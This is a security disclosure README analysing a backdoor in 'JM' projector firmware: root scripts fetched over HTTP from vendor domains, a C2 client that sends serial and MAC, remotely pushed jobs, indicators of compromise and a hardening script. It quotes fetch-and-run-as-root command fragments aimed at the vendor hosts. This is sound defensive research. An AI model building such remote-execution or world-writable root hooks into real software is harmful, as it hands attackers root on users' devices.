# JM firmware backdoor (Amlogic T950S projectors)

Found on a KAW K670 (`ro.jm.board.name=W5`, Android 13 userdebug) on 2026-10-21. The same firmware family ("JM", domains
`jiumaoos.com` and `v7/v8/v9ying.com`) ships on other budget projectors; `tools/scan.sh` checks for every indicator below.

**Summary.** On every network connection the firmware downloads shell scripts over plain HTTP and runs them as root. The
server registers the device (serial, MAC, model, country), hands out jobs, and has used them to install adware, push a
second root daemon into `/system`, and uninstall competing apps. Anyone who can answer those HTTP requests (the vendor, a
network on the path, or whoever owns the domains later) gets root on the projector.

## Chain

1. **Framework trigger.** `service-connectivity.jar` → `ConnectivityService`, in a 1 s LED loop:
   `if ((wifiConnected || ethernetOn) && !"1".equals(SystemProperties.get("sys.jm.ttyunos"))) setProp("sys.jm.ttyunos", "1")`.
2. **`/system/etc/init/ttyunos.rc`**
   - `on property:sys.boot_completed=1` → `copytty.sh` copies `/system/etc/{ttyunos,v9ying,custom}.sh` into `/data/ttyunos/`
     (only if missing) and **chmods them 777**. Any app can rewrite them: a local root escalation on its own.
   - `on property:sys.jm.ttyunos=1` → services `ttyunos` and `v9ying` run `/data/ttyunos/*.sh` as root (`seclabel u:r:shell:s0`,
     SELinux is disabled anyway).
3. **`ttyunos.sh`**: `curl http://jm.v7ying.com/install-host.sh` → run (sets `persist.sys.jm.url=https://apk.v8ying.com`), then
   `curl ${persist.sys.jm.url}/install-recovery-curl.sh` → `/data/install-recovery.sh` → run.
   **`v9ying.sh`**: `curl http://jm.v9ying.com/install-recovery-v9-curl.sh` → run.
4. **`/data/install-recovery.sh`** (C2 client, host `http://123.207.77.74`, requests "signed" with an MD5 over a hard-coded secret):
   - country from `ifconfig.co/country-iso` or `ipinfo.io/country`
   - `POST /product/adrDevice/saveDevice` once: language, model, build, **serial, MAC**, country, board
   - `POST /product/adrDevice/firstTimeOnline` / `secondOnlineLaunch` daily (usage tracking)
   - `POST /product/adrDevice/start` (sends the job ids already done, from `/data/local/rule/`) → `tar.gz` → extract to
     `/data/local/shell` → **run every `.sh` inside as root** → delete
   - `curl ${host}/install-end.sh` → run as root
   - log: `/data/local/install/script.log`
5. **`jmsu`** (pushed by a job into the adb-remount overlay `/mnt/scratch/overlay/system/upper/bin/jmsu`, with
   `etc/init/root_access.rc`): a Superuser (koush) `su --daemon` with an added `--autoload` that fetches a signed payload from
   `persist.sys.proxy.url` (`https://apk.v8ying.com/ota.bin`) and runs it as root. The factory image has an older `jmsu`
   (391 532 bytes) that is a plain su daemon without autoload.
6. **Other root entry points** in `/system/etc/init/preinstall.rc`: `agent` runs `/data/local/agent.sh` as root on boot;
   `upgrade.sh` installs APKs and runs `jm.sh` from a `jm/` folder on any USB drive; `installxapk.sh` installs whatever path
   `vendor.jm.apk.path` names.
7. **App-level installers.** The stock launcher `com.master.t972` (uid system) asks `http://txy.jiumaoos.com/official/detail/apkInfo`
   and silently installs the returned APK. The vendor store `com.master.tv.market` does the same for xapks.

## Observed jobs (job id = server creation time)

| Job | Created | Effect |
|---|---|---|
| `1784357513` | 2026-07-18 | `pm uninstall` of `com.valor.mfc.droid.tvapp.generic`, `com.mm.droid.livetv.tve(s)` (IPTV competitors) |
| `jm.jmsu_1789003463`, `root.access_1789003485` | 2026-09-10 | `jmsu` with autoload + `root_access.rc` into `/system` |
| `com.smart.tv.launcher_1789178605` | 2026-09-12 | download `https://apk.v8ying.com/TCL/app-jm-screensaver.apk`, install as `com.smart.tv.launcher` |

`com.smart.tv.launcher`: `com.cy.adplayer.services.AdServices`, SensorsData analytics, corner ads, `tcl_ad` / `ad_config`
prefs, downloads `.jar` plugins (`pcam.jar`, `app_pccache`); connected to 101.33.15.82, 20.24.11.29, 47.90.183.172.

## Indicators of compromise

| Type | Value |
|---|---|
| Domains | `jm.v7ying.com`, `apk.v8ying.com`, `jm.v9ying.com`, `txy.jiumaoos.com`, `appreg.clapvf.com`, `aats.amlogic.com` (OTA) |
| IP | `123.207.77.74` |
| Files | `/system/etc/init/ttyunos.rc`, `/system/bin/copytty.sh`, `/data/ttyunos/*.sh` (777), `/data/install-{host,recovery,end}.sh`, `/data/local/install/script.log`, `/data/local/rule/<job id>/`, `/data/local/push/`, `/mnt/scratch/overlay/system/upper/bin/jmsu` |
| Properties | `sys.jm.ttyunos`, `persist.sys.jm.url`, `persist.sys.proxy.url`, `persist.sys.jm.count`, `persist.sys.jm.active.date` |
| `jmsu` (autoload) | 1 023 860 bytes, MD5 `1a7487d267cfab22d6f2e8119da3734b` |
| `jmsu` (factory) | 391 532 bytes, MD5 `d2f0a6bd4f92243b80338ea333a75b00` |
| Packages | `com.smart.tv.launcher` (adware), `com.master.t972` and `com.master.tv.market` (silent installers) |

## What `tools/harden.sh` does

Overlay overrides in `/mnt/scratch/overlay/system/upper` (the same mechanism the vendor used):
`ttyunos.rc` and `root_access.rc` emptied; `/system/etc/{ttyunos,v9ying,custom}.sh`, `bin/upgrade.sh`, `bin/installxapk.sh`
replaced by stubs; `/system/etc/hosts` blocks the domains; `c2block.rc` runs `c2block.sh` on every boot (iptables REJECT for the
IP, stubs back into `/data/ttyunos` and `/data/local/agent.sh` as root 755, `/data/install-*.sh` removed, the two URL properties
cleared, the stock launcher re-disabled when ours is installed). Disables `com.droidlogic.updater` and
`com.koushikdutta.superuser`. Moves the pushed `jmsu` and the downloaded scripts to `/data/local/quarantine`.

**Not fixable without reflashing:** the `ConnectivityService` trigger (harmless once nothing answers it), and a factory
reset, which wipes `/mnt/scratch` and restores everything. The only complete mitigation is keeping the projector off the
network and feeding it over HDMI.
